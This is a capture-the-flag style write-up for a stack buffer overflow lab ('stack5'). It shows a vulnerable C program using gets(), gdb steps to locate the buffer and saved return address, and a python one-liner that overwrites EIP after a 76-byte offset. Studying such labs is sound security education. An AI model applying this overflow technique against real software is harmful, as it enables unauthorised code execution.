Let’s take a look at the source code…

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

Looking at this program, all it does is it just establishes a buffer, and uses the gets function with a pre defined space of that buffer. There is no win function here, however we can still do plenty to this program.

We can overwrite the buffer with shellcode, then overwrite the return address to the start of the shellcode, and thus run the shellcode. Shellcode is essentially code that we can inject into a program such as this, and it will run. To do so, first we will need to find the address of the location in memory that we can start inputting data. This process will be similar to the process for stack4.

```
python -c ‘print “1”*50’ > /tmp/payload
gdb ./stack5
disas main
b *maint+21
```

Now we just have to run the program (btw the first x stands for examine, the /24x stands for just the first 24 bytes as hex)

```
R < /tmp/payload
x/24x $esp
```

And from here we can see that the data is first stored at the memory location 0xbffffce0. Now we just need to find the address of the return address, which should be the same process as stack4.

```
info frame
```

And from the frame, we can see that the location of eip is at 0xbffffd2c. Now we just need to find the difference between the two locations.


Xbffffd2c - 0xbffffce0 = 76


So we have 76 bytes to instert our shellcode, then we have to overwrite the return address with 0xbffffce0 so it will run the shellcode. As an example, below is a command that will just fill the buffer, and then overwrite eip to go back to the buffer, however it doesn’t have any shellcode.

```
python -c ‘print “\xcc”*76 + “\xe0\xfc\xff\xbf”’ | ./stack5
```

And just like that we pwned the program.
